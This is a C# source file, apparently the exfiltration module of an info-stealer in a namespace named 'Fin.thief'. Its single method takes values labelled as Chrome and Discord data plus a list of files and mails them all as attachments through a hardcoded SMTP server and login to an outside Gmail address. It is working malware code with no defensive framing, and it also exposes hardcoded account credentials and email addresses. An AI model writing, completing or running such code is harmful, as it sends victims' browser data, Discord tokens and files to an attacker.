﻿        using System;
        using System.Collections.Generic;
        using System.IO;
        using System.Net;
using System.Net.Mail;
        using System.Text;


        namespace Fin.thief
{
    public class Sender
    {

public static void email_send(String DCT, string CHT, List<string> files, string text)
{
    Console.WriteLine("hello");
    MailMessage mail = new MailMessage();
    SmtpClient SmtpServer = new SmtpClient("cmail01.mc-host24.de", 25);
    mail.From = new MailAddress("gute@fatale-randale.de");
    mail.To.Add("rasahleanu@gmail.com"); //
    mail.Subject = "Testest";
    mail.Body = "Chrome: " + CHT + "Discord: " + DCT ;
    
    foreach (var file in files)
    {
        Console.WriteLine("hello5");
        System.Net.Mail.Attachment attachment;
        attachment = new System.Net.Mail.Attachment(file);
        mail.Attachments.Add(attachment); 
    }

    var ms = new System.IO.MemoryStream();
    
    System.IO.StreamWriter writer = new System.IO.StreamWriter(ms);
    writer.Write(text);
    writer.Flush();
    
    ms.Position = 0;
    
    System.Net.Mime.ContentType ct = new System.Net.Mime.ContentType(System.Net.Mime.MediaTypeNames.Text.Plain);
    System.Net.Mail.Attachment attach = new System.Net.Mail.Attachment(ms, ct);
    Console.WriteLine("hello2");
    
    attach.ContentDisposition.FileName = "temp3.txt";
    mail.Attachments.Add(attach);
   

    SmtpServer.Port = 587;
    SmtpServer.Credentials = new System.Net.NetworkCredential("gute@fatale-randale.de", "gutefrage");
    SmtpServer.EnableSsl = true;
    Console.WriteLine("hello6");
    SmtpServer.Send(mail);

}
    }
}